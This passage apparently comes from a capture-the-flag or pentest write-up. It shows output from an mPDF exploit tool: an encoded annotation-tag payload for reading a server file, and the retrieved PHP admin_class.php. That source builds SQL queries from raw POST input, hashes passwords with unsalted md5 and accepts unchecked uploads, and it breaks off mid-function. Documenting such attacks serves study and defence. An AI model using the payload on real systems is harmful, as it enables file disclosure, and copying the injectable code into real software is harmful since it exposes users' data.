<span class="w">                         </span><span class="p">|</span><span class="w">  </span>__<span class="w"> </span><span class="se">\|</span><span class="w">  </span>__<span class="w"> </span><span class="se">\|</span><span class="w">  </span>____<span class="p">|</span><span class="w"> </span><span class="p">|</span>____<span class="w">  </span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\ \ \ </span>/<span class="w"> </span>/<span class="w">                 </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">     </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span>
<span class="w">               </span>_<span class="w"> </span>__<span class="w"> </span>___<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="w">        </span>/<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\ </span>V<span class="w"> </span>/<span class="w">    </span>_____<span class="w">  </span>___<span class="w"> </span>__<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>___<span class="w">  </span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_
<span class="w">               </span><span class="p">|</span><span class="w"> </span><span class="s1">&#39;_ ` _ \|  ___/| |  | |  __|      / /| | | |  &gt; &lt;    / _ \ \/ / &#39;</span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span><span class="p">|</span>/<span class="w"> </span>_<span class="w"> </span><span class="se">\|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>__<span class="p">|</span>
<span class="w">               </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">    </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">        </span>/<span class="w"> </span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>/<span class="w"> </span>.<span class="w"> </span><span class="se">\ </span><span class="w"> </span><span class="p">|</span><span class="w">  </span>__/&gt;<span class="w">  </span>&lt;<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">(</span>_<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>_
<span class="w">               </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span><span class="w"> </span><span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span><span class="w">    </span><span class="p">|</span>_____/<span class="p">|</span>_<span class="p">|</span><span class="w">       </span>/_/<span class="w"> </span><span class="o">(</span>_<span class="o">)</span>___<span class="o">(</span>_<span class="o">)</span>_/<span class="w"> </span><span class="se">\_\ </span><span class="w"> </span><span class="se">\_</span>__/_/<span class="se">\_\ </span>.__/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>_<span class="p">|</span>
<span class="w">                                                                               </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
<span class="w">                                                                               </span><span class="p">|</span>_<span class="p">|</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Replace<span class="w"> </span>the<span class="w"> </span>content<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>payload<span class="w"> </span>below
Double<span class="w"> </span>url<span class="w"> </span>encoded<span class="w"> </span>payload:
%253Cannotation%2520file%253D%2522/var/www/scheduling/admin/admin_class.php%2522%2520content%253D%2522/var/www/scheduling/admin/admin_class.php%2522%2520icon%253D%2522Graph%2522%2520title%253D%2522Attached%2520File%253A%2520/var/www/scheduling/admin/admin_class.php%2522%2520pos-x%253D%2522195%2522%2520/%253E

Base64<span class="w"> </span>encoded<span class="w"> </span>payload:
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwJTI1MjIlMjUyMGNvbnRlbnQlMjUzRCUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwaWNvbiUyNTNEJTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZSUyNTNEJTI1MjJBdHRhY2hlZCUyNTIwRmlsZSUyNTNBJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBwb3MteCUyNTNEJTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
</pre></div>
</div>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">Class</span> <span class="nc">Action</span> <span class="p">{</span>
        <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
                <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">include</span> <span class="s1">&#39;db_connect.php&#39;</span><span class="p">;</span>

    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="nv">$conn</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
            <span class="nb">ob_end_flush</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="nf">login</span><span class="p">(){</span>

                        <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                        <span class="nv">$qry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users where username = &#39;&quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;&#39; and password = &#39;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;password&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
                                                <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
                                <span class="p">}</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_type&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
                                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                                        <span class="p">}</span>
                                        <span class="k">return</span> <span class="mi">2</span> <span class="p">;</span>
                                        <span class="k">exit</span><span class="p">;</span>
                                <span class="p">}</span>
                                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                                <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
                        <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">login_faculty</span><span class="p">(){</span>

                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$qry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT *,concat(lastname,&#39;, &#39;,firstname,&#39; &#39;,middlename) as name FROM faculty where id_no = &#39;&quot;</span><span class="o">.</span><span class="nv">$id_no</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;password&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
                                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
                <span class="p">}</span>
<span class="p">}</span>
        <span class="k">function</span> <span class="nf">login2</span><span class="p">(){</span>

                        <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$email</span><span class="p">))</span>
                                <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
                <span class="nv">$qry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users where username = &#39;&quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;&#39; and password = &#39;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;passwors&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
                                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_alumnus_id&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                                <span class="nv">$bio</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM alumnus_bio where id = &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_alumnus_id&#39;</span><span class="p">]);</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$bio</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$bio</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;passwors&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
                                                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">][</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
                                        <span class="p">}</span>
                                <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">][</span><span class="s1">&#39;status&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
                                        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                                <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                                        <span class="p">}</span>
                                        <span class="k">return</span> <span class="mi">2</span> <span class="p">;</span>
                                        <span class="k">exit</span><span class="p">;</span>
                                <span class="p">}</span>
                                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">logout</span><span class="p">(){</span>
                <span class="nb">session_destroy</span><span class="p">();</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;location:login.php&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">logout2</span><span class="p">(){</span>
                <span class="nb">session_destroy</span><span class="p">();</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;location:../index.php&quot;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="nf">save_user</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; name = &#39;</span><span class="si">$name</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, username = &#39;</span><span class="si">$username</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, password = &#39;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, type = &#39;</span><span class="si">$type</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
                        <span class="nv">$establishment_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, establishment_id = &#39;</span><span class="si">$establishment_id</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;Select * from users where username = &#39;</span><span class="si">$username</span><span class="s2">&#39;;&quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
                        <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)){</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO users set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE users set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot; where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">delete_user</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$delete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM users where id = &quot;</span><span class="o">.</span><span class="nv">$id</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="p">)</span>
                        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">signup</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; name = &#39;&quot;</span><span class="o">.</span><span class="nv">$firstname</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$lastname</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, username = &#39;</span><span class="si">$email</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, password = &#39;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users where username = &#39;</span><span class="si">$email</span><span class="s2">&#39; &quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
                        <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO users set &quot;</span><span class="o">.</span><span class="nv">$data</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">){</span>
                        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">insert_id</span><span class="p">;</span>
                        <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">){</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$k</span> <span class="o">==</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
                                        <span class="k">continue</span><span class="p">;</span>
                                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="p">)</span>
                                        <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; </span><span class="si">$k</span><span class="s2"> = &#39;</span><span class="si">$v</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                                <span class="k">else</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, </span><span class="si">$k</span><span class="s2"> = &#39;</span><span class="si">$v</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
                                                        <span class="nv">$fname</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;y-m-d H:i&#39;</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
                                                        <span class="nv">$move</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="s1">&#39;assets/uploads/&#39;</span><span class="o">.</span> <span class="nv">$fname</span><span class="p">);</span>
                                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, avatar = &#39;</span><span class="si">$fname</span><span class="s2">&#39; &quot;</span><span class="p">;</span>

                        <span class="p">}</span>
                        <span class="nv">$save_alumni</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;INSERT INTO alumnus_bio set </span><span class="si">$data</span><span class="s2"> &quot;</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
                                <span class="nv">$aid</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">insert_id</span><span class="p">;</span>
                                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE users set alumnus_id = </span><span class="si">$aid</span><span class="s2"> where id = </span><span class="si">$uid</span><span class="s2"> &quot;</span><span class="p">);</span>
                                <span class="nv">$login</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">login2</span><span class="p">();</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$login</span><span class="p">)</span>
                                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
                        <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">update_account</span><span class="p">(){</span>
                <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; name = &#39;&quot;</span><span class="o">.</span><span class="nv">$firstname</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$lastname</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, username = &#39;</span><span class="si">$email</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span>
                <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, password = &#39;&quot;</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; &quot;</span><span class="p">;</span>
                <span class="nv">$chk</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users where username = &#39;</span><span class="si">$email</span><span class="s2">&#39; and id != &#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$chk</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
                        <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>
                        <span class="nv">$save</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;UPDATE users set </span><span class="si">$data</span><span class="s2"> where id = &#39;</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login_id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#39; &quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$save</span><span class="p">){</span>
                        <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">){</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$k</span> <span class="o">==</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
                                        <span class="k">continue</span><span class="p">;</span>
                                <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span> <span class="p">)</span>
                                        <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot; </span><span class="si">$k</span><span class="s2"> = &#39;</span><span class="si">$v</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                                <span class="k">else</span>
                                        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;, </span><span class="si">$k</span><span class="s2"> = &#39;</span><span class="si">$v</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
                        <span class="p">}</span>
